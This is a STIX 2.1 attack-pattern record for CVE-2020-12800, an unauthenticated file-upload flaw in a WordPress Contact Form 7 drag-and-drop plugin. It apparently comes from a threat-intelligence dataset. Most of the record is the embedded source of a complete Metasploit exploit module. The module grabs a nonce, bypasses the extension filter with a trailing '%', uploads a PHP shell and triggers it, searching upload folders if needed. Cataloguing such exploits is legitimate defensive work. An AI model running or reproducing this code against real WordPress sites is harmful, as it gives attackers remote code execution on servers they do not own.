{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa1c75d6-4a28-4475-909e-03ff6686c05b",
    "created": "2024-08-14T17:10:22.636052Z",
    "modified": "2024-08-14T17:10:22.636056Z",
    "name": "Wordpress Drag and Drop Multi File Uploader RCE",
    "description": " This module exploits a file upload feature of Drag and Drop Multi File Upload - Contact Form 7 for versions prior to 1.3.4.  The allowed file extension list can be bypassed by appending a %, allowing for php shells to be uploaded. No authentication is required for exploitation.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_dnd_mul_file_rce.rb",
            "external_id": "wp_dnd_mul_file_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-12800"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/amartinsec/CVE-2020-12800"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress Drag and Drop Multi File Uploader RCE',\n        'Description' => %q{\n          This module exploits a file upload feature of Drag and Drop Multi File\n          Upload - Contact Form 7 for versions prior to 1.3.4.  The allowed file\n          extension list can be bypassed by appending a %, allowing for php\n          shells to be uploaded.\n          No authentication is required for exploitation.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Austin Martin <amartin@amartinsec.com>' # original PoC, discovery\n        ],\n        'References' => [\n          ['EDB', '48520'],\n          ['CVE', '2020-12800'],\n          ['URL', 'https://github.com/amartinsec/CVE-2020-12800']\n        ],\n        'Platform' => ['php'],\n        'Privileged' => false,\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2020-05-11',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true, 'The URI of Wordpress', '/'])\n      ]\n    )\n  end\n\n  # recursively search uploads folder(s) to find our payload\n  def find_payload(path, payload_name)\n    return unless @payload_location.nil?\n\n    path = normalize_uri(target_uri.path, path)\n    print_status(\"Checking #{path}\")\n    res = send_request_cgi(\n      'uri' => path\n    )\n    unless res\n      vprint_error('Server didnt respond when attempting to trigger payload')\n      return\n    end\n    if res.body.include? payload_name\n      print_good(\"Found payload: #{path}#{payload_name}\")\n      @payload_location = \"#{path}#{payload_name}\"\n      return\n    end\n\n    # /a href=\"([\\w\\-\\/]+)\"/.match(res.body) do |url|\n    res.body.scan(%r{a href=\"([\\w\\-/]+)\"}) do |url|\n      if url[0].start_with? '/'\n        # skip it, its the parent directory\n      elsif url[0].end_with? '/'\n        find_payload(\"#{path}#{url[0]}\", payload_name)\n      end\n    end\n  end\n\n  def check\n    begin\n      return check_plugin_version_from_readme('drag-and-drop-multiple-file-upload-contact-form-7', '1.3.4', '1')\n    rescue ::Rex::ConnectionError\n      vprint_error('Could not connect to the web service')\n      return CheckCode::Unknown\n    end\n    CheckCode::Safe\n  end\n\n  def exploit\n    vprint_status('Getting nonce')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path)\n    )\n    unless res\n      fail_with(Failure::Unreachable, 'No server response')\n    end\n\n    if res.code != 200\n      fail_with(Failure::UnexpectedReply, 'Non-200 response, check targeturi')\n    end\n\n    /ajax_nonce\":\"(?<nonce>.{10})\"/ =~ res.body\n    if nonce.nil?\n      fail_with(Failure::UnexpectedReply, 'Nonce not found')\n    end\n    print_status(\"Nonce: #{nonce}\")\n\n    payload_name = \"#{rand_text_alphanumeric(6..12)}.php\"\n\n    data = Rex::MIME::Message.new\n    data.add_part('5242880', nil, nil, 'form-data; name=\"size_limit\"')\n    data.add_part('php%', nil, nil, 'form-data; name=\"supported_type\"')\n    data.add_part('dnd_codedropz_upload', nil, nil, 'form-data; name=\"action\"')\n    data.add_part('click', nil, nil, 'form-data; name=\"type\"')\n    data.add_part(nonce, nil, nil, 'form-data; name=\"security\"')\n    data.add_part(payload.encoded, 'text/plain', nil, \"form-data; name='upload-file'; filename='#{payload_name}%'\")\n\n    # grab our valid cookie\n    cookie = res.get_cookies\n\n    vprint_status('Attempting payload upload')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),\n      'method' => 'POST',\n      'cookie' => cookie,\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data.to_s\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, 'No server response')\n    end\n\n    if res.code == 403\n      fail_with(Failure::UnexpectedReply, '403 response, nonce detection failed')\n    elsif res.code == 500\n      fail_with(Failure::UnexpectedReply, '500 response, server misconfigured, may need php-mbstring')\n    end\n    print_good('Payload uploaded successfully')\n    register_file_for_cleanup(payload_name)\n\n    # first we attempt to trigger the most obvious location of the payload.\n    print_status('Attempting to trigger at well known location')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'wp-content', 'uploads', 'wp_dndcf7_uploads', 'wpcf7-files', payload_name)\n    )\n\n    unless session_created?\n      fail_with(Failure::Unreachable, 'No server response') unless res\n\n      # dont need to check for 200, since that would have triggered our payload\n      if res.code != 200\n        print_status('Bruteforcing for payload to trigger')\n        find_payload(normalize_uri(target_uri.path, 'wp-content', 'uploads', '/'), payload_name)\n        unless @payload_location\n          fail_with(Failure::Unknown, 'Unable to determine uploaded shell path')\n        end\n        # lastly, if we have a location found, trigger it\n        send_request_cgi('uri' => @payload_location)\n      end\n    end\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, 'Could not connect to the web service')\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-05-11",
    "x_mitre_platforms": [
        "['php']"
    ]
}